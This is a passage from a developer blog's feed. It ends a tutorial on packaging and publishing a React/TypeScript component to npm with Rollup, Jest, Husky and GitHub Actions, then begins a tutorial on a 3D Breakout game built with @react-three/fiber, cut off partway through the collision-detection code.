class="string">&#x27;Dry&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Add new scripts commands <em><strong>build</strong></em> and <em><strong>build:types</strong></em> to the <em><strong>package.json</strong></em> file. </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;@bk/sum&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A react component that sum two numbers.&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;repository&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@github.com:Beking0912/react-typescript-rollup-starter.git&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lib/bundle.cjs.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lib/bundle.esm.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;browser&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lib/bundle.browser.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;types&quot;</span><span class="punctuation">:</span> <span class="string">&quot;types/index.d.ts&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rollup -c&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build:types&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tsc&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Gloria Su&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@rollup/plugin-commonjs&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^24.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@rollup/plugin-node-resolve&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^15.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@rollup/plugin-typescript&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^11.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@types/react&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^18.0.28&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@types/styled-components&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.1.26&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;react&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^18.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rollup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.15.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;styled-components&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.3.6&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typescript&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.9.5&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;tslib&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.5.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Run <em><strong>npm run build</strong></em> and <em><strong>npm run build:types</strong></em> to view the bundled results.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br><span class="line">npm run build:types</span><br></pre></td></tr></table></figure><h2 id="Add-ts-jest"><a href="#Add-ts-jest" class="headerlink" title="Add ts-jest"></a>Add ts-jest</h2><p><strong><a href="https://github.com/kulshekhar/ts-jest">ts-jest</a></strong> simplifies the process of writing and running tests for TypeScript code, and can also make it easier for other developers to contribute to the project.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i jest ts-jest @types/jest -D</span><br><span class="line">npx ts-jest config:init</span><br></pre></td></tr></table></figure><p>Add testing scripts to the package.json file.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jest&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Create a <em><strong>test</strong></em> directory in the root folder to store test files, and run <em><strong>npm run test</strong></em> to view the status of the test cases.</p><h2 id="Husky-configuration"><a href="#Husky-configuration" class="headerlink" title="Husky configuration"></a>Husky configuration</h2><p>Use <strong><a href="tttps://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Ftypicode%2Fhusky%2Ftree%2Fmain">Husky</a></strong> to standardize the format of commit messages, which makes it easier to generate a CHANGELOG through scripts later.<br>Firstly, add the prepare scripts to the <em><strong>package.json</strong></em> file:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;hooks&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;pre-commit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;npm test &amp;&amp; npm run foo&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prepare&quot;</span><span class="punctuation">:</span> <span class="string">&quot;husky install&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm set-script prepare <span class="string">&quot;husky install&quot;</span></span><br><span class="line">npm run prepare</span><br></pre></td></tr></table></figure><p>Configure the Husky hooks in the <em><strong>package.json</strong></em> file using the husky property.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx husky add .husky/pre-commit npm <span class="built_in">test</span> &amp;&amp; npm run foo</span><br></pre></td></tr></table></figure><h2 id="Github-Action"><a href="#Github-Action" class="headerlink" title="Github Action"></a>Github Action</h2><p>GitHub Actions allows to automate your entire development workflow, from code changes to production deployment, all within the GitHub environment. The following configuration is mainly to let Github Action help us run lint and test, and when we push a tag, it will help us publish the package to npm and deploy the latest documentation.</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">dry</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">tags:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span>           <span class="comment"># Push events to every tag not containing /</span></span><br><span class="line">  <span class="attr">pull_request:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span>       <span class="comment"># https://github.blog/changelog/2020-07-06-github-actions-manual-triggers-with-workflow_dispatch/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-18.04</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span>   </span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">persist-credentials:</span> <span class="literal">false</span> <span class="comment"># otherwise, the token used is the GITHUB_TOKEN, instead of your personal token</span></span><br><span class="line">          <span class="attr">fetch-depth:</span> <span class="number">0</span> <span class="comment"># otherwise, you will failed to push refs to dest repo</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span>  </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/cache@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">~/.npm</span></span><br><span class="line">          <span class="attr">key:</span> <span class="string">$&#123;&#123;</span> <span class="string">runner.os</span> <span class="string">&#125;&#125;-node-$&#123;&#123;</span> <span class="string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">restore-keys:</span> <span class="string">|</span></span><br><span class="line"><span class="string">            $&#123;&#123; runner.os &#125;&#125;-node-</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">check</span> <span class="string">code</span>   </span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string">          npm run lint</span></span><br><span class="line"><span class="string">          npm run test</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">echo</span> <span class="string">&quot;//registry.npmjs.org/:_authToken=$<span class="template-variable">&#123;&#123; secrets.NPM_TOKEN &#125;&#125;</span>&quot;</span> <span class="string">&gt;</span> <span class="string">~/.npmrc</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">publish</span>                          </span><br><span class="line">        <span class="attr">if:</span> <span class="string">$&#123;&#123;contains(github.ref,</span> <span class="string">&#x27;refs/tags/&#x27;</span><span class="string">)&#125;&#125;</span>  </span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm run build</span></span><br><span class="line"><span class="string">          npm run build:types</span></span><br><span class="line"><span class="string">          npm run docs:build</span></span><br><span class="line"><span class="string">          npm publish --access public</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">deploy</span>                         </span><br><span class="line">        <span class="attr">if:</span> <span class="string">$&#123;&#123;contains(github.ref,</span> <span class="string">&#x27;refs/tags/&#x27;</span><span class="string">)&#125;&#125;</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">JamesIves/github-pages-deploy-action@4.1.1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">branch:</span> <span class="string">gh-pages</span> <span class="comment"># The branch the action should deploy to.</span></span><br><span class="line">          <span class="attr">folder:</span> <span class="string">docs/.vuepress/dist</span> <span class="comment"># The folder the action should deploy.</span></span><br></pre></td></tr></table></figure><h2 id="Publish"><a href="#Publish" class="headerlink" title="Publish"></a>Publish</h2><p>Update the version number of the package, and push any new tags created to the remote repository.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm version patch/tag</span><br><span class="line">git push</span><br><span class="line">git push origin --tags</span><br></pre></td></tr></table></figure><p>Retrieve the registry URL that is configured for the local npm installation.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p>Log in to an npm registry with credentials which is necessary in order to publish packages to the registry.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm adduser</span><br></pre></td></tr></table></figure><p>Check whether the currently named package already exists.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm info @bk/sum@version</span><br></pre></td></tr></table></figure><p>Publish or delete a package.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br><span class="line">npm unpublish @bk/sum --force</span><br><span class="line"></span><br><span class="line">npm unpublish @bk/sum@version</span><br></pre></td></tr></table></figure><h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i bk-sum</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Sum</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@bk/sum&#x27;</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="title class_">Sum</span> a=&#123;<span class="number">2</span>&#125; b=&#123;<span class="number">3</span>&#125;/&gt;</span><br></pre></td></tr></table></figure><hr><p>References:</p><ul><li><a href="https://dev.to/siddharthvenkatesh/component-library-setup-with-react-typescript-and-rollup-onj">https://dev.to/siddharthvenkatesh/component-library-setup-with-react-typescript-and-rollup-onj</a></li><li><a href="https://juejin.cn/post/6950557086916804645#heading-0">https://juejin.cn/post/6950557086916804645#heading-0</a></li><li><a href="https://juejin.cn/post/6934507948911788045">https://juejin.cn/post/6934507948911788045</a></li></ul><p>üîç Check out my code in <a href="https://github.com/Beking0912/react-typescript-rollup-starter"><strong>github</strong></a>.<br>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#x62;&#x73;&#x75;&#x35;&#x40;&#x6e;&#x63;&#115;&#117;&#46;&#101;&#100;&#x75;">&#x62;&#x73;&#x75;&#x35;&#x40;&#x6e;&#x63;&#115;&#117;&#46;&#101;&#100;&#x75;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2023/02/18/ojxUeXibkZClKzt.png&quot; alt=&quot;rollup-typescript _2_.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;In this tutorial, I‚Äôll walk you thr</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    
    <category term="React" scheme="https://beking0912.github.io/tags/React/"/>
    
    <category term="TypeScript" scheme="https://beking0912.github.io/tags/TypeScript/"/>
    
    <category term="Rollup" scheme="https://beking0912.github.io/tags/Rollup/"/>
    
    <category term="npm" scheme="https://beking0912.github.io/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>üéÆ Game Development: 3D Breakout</title>
    <link href="https://beking0912.github.io/2022/12/13/3D-Breakout-with-react-three-fiber/"/>
    <id>https://beking0912.github.io/2022/12/13/3D-Breakout-with-react-three-fiber/</id>
    <published>2022-12-14T01:27:54.000Z</published>
    <updated>2023-02-19T20:55:20.889Z</updated>
    
    <content type="html"><![CDATA[<p>Are you a fan of classic games like Breakout, but looking to add a modern twist?<br>Look no further than @react-three&#x2F;fiber, a powerful library for creating 3D graphics in React. In this tutorial, we‚Äôll explore how to use @react-three&#x2F;fiber to build a 3D version of Breakout. Let‚Äôs get started and bring Breakout into the world of 3D!<br>If you are not familiar with the game, you can play it online <a href="https://elgoog.im/breakout/">here</a> or <a href="https://www.crazygames.com/game/atari-breakout">here</a>.</p><p><img src="https://s2.loli.net/2022/12/19/c64ShNkIOVyQPHn.png" alt="breakout.png"></p><h2 id="Game-design"><a href="#Game-design" class="headerlink" title="Game design"></a>Game design</h2><ol><li>Render bricks, ball and paddle in 3D. All motion is in 2D.</li><li>The ball starts over in a random direction if it misses the paddle. </li><li>When the ball strikes sth, it should bounce off with reflected arrival angle.</li><li>User can move the paddle to the left and right. </li><li>When the ball strikes brick, it disappears. </li><li>The game ends when all bricks disappear.</li></ol><h2 id="Basic-scene"><a href="#Basic-scene" class="headerlink" title="Basic scene"></a>Basic scene</h2><p>As the <a href="https://docs.pmnd.rs/react-three-fiber/getting-started/your-first-scene">official documentation</a> said, the Canvas component does some important setup work behind the scenes: It sets up a Scene and a Camera, the basic building blocks necessary for rendering; And it renders our scene every frame, you do not need a traditional render-loop.<br>Then add some lights to the scene by putting components into canvas like ambientLight that is directly equivalent to <code>new THREE.AmbientLight()</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Canvas</span> shadows camera=&#123;&#123; <span class="attr">position</span>: [<span class="number">0</span>, <span class="number">0</span>, -<span class="number">11</span>], <span class="attr">fov</span>: <span class="number">50</span> &#125;&#125;&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">ambientLight</span> <span class="attr">intensity</span>=<span class="string">&#123;0.3&#125;</span> /&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">pointLight</span> <span class="attr">position</span>=<span class="string">&#123;[10,</span> <span class="attr">10</span>, <span class="attr">5</span>]&#125; /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">Canvas</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="Create-bricks-ball-and-paddle"><a href="#Create-bricks-ball-and-paddle" class="headerlink" title="Create bricks, ball and paddle"></a>Create bricks, ball and paddle</h2><p>The mesh component is a basic scene object in <code>three.js</code> that is directly equivalent to <code>new THREE.Mesh()</code>, and it is used to hold the geometry and materials needed to represent a shape in 3D space. Then we can create a new mesh using a <code>BoxGeometry</code> and a <code>MeshStandardMaterial</code> which automatically attach to their parent.<br>To build the paddle, we use the <code>boxGeometry</code> component to create a 3D box geometry, and it accepts arguments include the width, height and depth of the box. Same way to build the wall.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Paddle</span>(<span class="params">&#123; args = [WIDTH, HEIGHT, DEPTH], color, position &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">mesh</span> <span class="attr">name</span>=<span class="string">&quot;paddle&quot;</span> <span class="attr">position</span>=<span class="string">&#123;position&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">boxGeometry</span> <span class="attr">args</span>=<span class="string">&#123;args&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">meshStandardMaterial</span> <span class="attr">color</span>=<span class="string">&#123;color&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">mesh</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To build the ball, we use the <code>sphereGeometry</code> component to create a sphere, and it accepts five arguments:</p><ol><li>radius: The radius of the sphere (default is 1).</li><li>widthSegments: The number of segments along the width of sphere (default 8).</li><li>heightSegments: The number of segments along the height of sphere (default 6).</li><li>phiStart: The angle at which to start creating sphere (default 0).</li><li>phiLength: The angle at which to end creating sphere (default Math.PI * 2).</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Ball</span>(<span class="params">&#123; args = [RADIUS, <span class="number">32</span>, <span class="number">32</span>], color, position &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">mesh</span> <span class="attr">name</span>=<span class="string">&quot;ball&quot;</span> <span class="attr">position</span>=<span class="string">&#123;position&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">sphereGeometry</span> <span class="attr">args</span>=<span class="string">&#123;args&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">meshStandardMaterial</span> <span class="attr">color</span>=<span class="string">&#123;color&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">mesh</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Interaction"><a href="#Interaction" class="headerlink" title="Interaction"></a>Interaction</h2><p>The user can move the paddle left and right.<br>Unlike traditional game rules, the position of the paddle will be manipulated using a change of mouse position instead of using keyboard keys. Keeps the mouse offset a multiple of the paddle position when the user changes the position of the 3D camera by calculating the distance from the 3D camera to the paddle. And limit the paddle position interval according to the position of the left and right walls.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ref = <span class="title function_">useRef</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; camera &#125; = <span class="title function_">useThree</span>();</span><br><span class="line"><span class="title function_">useFrame</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> distance = ref.<span class="property">current</span>.<span class="property">position</span>.<span class="title function_">distanceTo</span>(camera.<span class="property">position</span>);</span><br><span class="line">    ref.<span class="property">current</span>.<span class="property">position</span>.<span class="property">x</span> = <span class="title class_">Math</span>.<span class="title function_">max</span>(minX, <span class="title class_">Math</span>.<span class="title function_">min</span>(maxX, -state.<span class="property">mouse</span>.<span class="property">x</span> * distance));</span><br><span class="line">    ref.<span class="property">current</span>.<span class="property">position</span>.<span class="property">y</span> = y;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="3D-collision-detection"><a href="#3D-collision-detection" class="headerlink" title="3D collision detection"></a>3D collision detection</h2><h3 id="Using-AABB"><a href="#Using-AABB" class="headerlink" title="Using AABB"></a>Using AABB</h3><p>AABB stands for Axis-Aligned Bounding Box.<br>To test whether a sphere and an AABB (Axis-Aligned Bounding Box) are colliding, we can use the Separating Axis Theorem (SAT). This theorem states that if two convex shapes are not colliding, then there must exist an axis along which the two shapes are separated.<br>First check if the sphere is within the AABB‚Äôs boundaries. If it is, then the two shapes are colliding. If not, then we can use the SAT to test for a collision. To do this, we need to check if the sphere is separated from the AABB along any of the three axes (x, y, and z). If the sphere is not separated from the AABB along any of the axes, then the two shapes are colliding.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">intersect</span>(<span class="params">sphere, box</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> x = <span class="title class_">Math</span>.<span class="title function_">max</span>(box.<span class="property">minX</span>, <span class="title class_">Math</span>.<span class="title function_">min</span>(sphere.<span class="property">x</span>, box.<span class="property">maxX</span>));</span><br><span class="line">  <span class="keyword">const</span> y = <span class="title class_">Math</span>.<span class="title function_">max</span>(box.<span class="property">minY</span>, <span class="title class_">Math</span>.<span class="title function_">min</span>(sphere.<span class="property">y</span>, box.<span class="property">maxY</span>));</span><br><span class="line">  <span class="keyword">const</span> z = <span class="title class_">Math</span>.<span class="title function_">max</span>(box.<span class="property">minZ</span>, <span class="title class_">Math</span>.<span class="title function_">min</span>(sphere.<span class="property">z</span>, box.<span class="property">maxZ</span>));</span><br><span class="line">  <span class="keyword">const</span> distance = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(</span><br><span class="line">    (x - sphere.<span class="property">x</span>) * (x - sphere.<span class="property">x</span>) +</span><br><span class="line">    (y - sphere.<span class="property">y</span>) * (y - sphere.<span class="property">y</span>) +</span><br><span class="line">    (z - sphere.<span class="property">z</span>) * (z - sphere.<span class="property">z</span>)</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> distance &lt; sphere.<span class="property">radius</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Using-Box3-and-Sphere"><a href="#Using-Box3-and-Sphere" class="headerlink" title="Using Box3 and Sphere"></a>Using Box3 and Sphere</h3><p>We can use the <code>Box3.intersectsSphere()</code> or <code>Sphere.intersectsBox()</code> method and it returns a boolean value indicating whether the two objects are intersecting.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> box = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Box3</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>(), <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>());</span><br><span class="line"><span class="keyword">const</span> sphere = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Sphere</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>(), <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> isIntersecting = box.<span class="title function_">intersectsSphere</span>(sphere); <span class="comment">// or sphere.intersectsBox(box);</span></span><br></pre></td></tr></table></figure><h3 id="Using-Raycaster"><a href="#Using-Raycaster" class="headerlink" title="Using Raycaster"></a>Using Raycaster</h3><p>Create a <code>Raycaster</code> object and set its origin to the center of the sphere and its direction to the center of the box. Then create a <code>Box3</code> object and set its min and max points to the box‚Äôs corner points. Finally, call the <code>Raycaster</code>‚Äòs <code>intersectObject()</code> method passing in the <code>Box3</code> object as an argument. If the method returns a non-null value, then the sphere and the box are colliding.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; 